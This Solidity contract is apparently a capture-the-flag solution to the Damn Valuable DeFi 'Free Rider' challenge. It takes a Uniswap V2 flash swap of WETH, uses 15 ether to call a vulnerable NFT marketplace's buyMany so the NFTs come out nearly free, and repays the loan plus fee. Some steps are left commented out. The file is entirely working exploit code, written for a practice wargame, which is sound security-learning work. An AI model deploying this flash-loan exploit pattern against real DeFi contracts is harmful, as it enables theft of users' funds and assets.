// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "hardhat/console.sol";

interface IWETH {
    function balanceOf(address) external view returns (uint256);

    function deposit() external payable;

    function withdraw(uint256) external;

    function transfer(address, uint256) external returns (bool);
}

contract FlashRider {
    FreeRiderNFTMarketplace public immutable market;
    IUniswapV2Factory public immutable factory;
    DamnValuableNFT public nft;

    constructor(
        address factoryAddress,
        address payable marketAddress,
        address nftAddress
    ) {
        factory = IUniswapV2Factory(factoryAddress);
        market = FreeRiderNFTMarketplace(marketAddress);
        nft = DamnValuableNFT(nftAddress);
        nft.setApprovalForAll(msg.sender, true);
    }

    function flashBuy(
        address token,
        address weth,
        uint256 amount,
        uint256[] calldata tokenIds,
        address receiver
    ) external {
        address pair = factory.getPair(token, weth);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = weth == token0 ? amount : 0;
        uint256 amount1Out = weth == token1 ? amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(tokenIds, receiver);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
        require(msg.sender == pair, "only pair");
        require(sender == address(this), "only me");

        uint256[] memory tokenIds;
        address receiver;
        (tokenIds, receiver) = abi.decode(data, (uint256[], address));

        uint256 amount = amount0 != 0 ? amount0 : amount1;
        address wethAddress = amount0 != 0 ? token0 : token1;
        IWETH weth = IWETH(wethAddress);

        weth.withdraw(15 ether);
        market.buyMany{value: 15 ether}(tokenIds);
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        uint256 amountRemain = address(this).balance - amountToRepay;

        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
        // payable(market).transfer(75 ether);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4) {
        // require(msg.sender == address(nft));
        // require(nft.ownerOf(_tokenId) == address(this));
        // nft.transferFrom(address(this), tx.origin, _tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
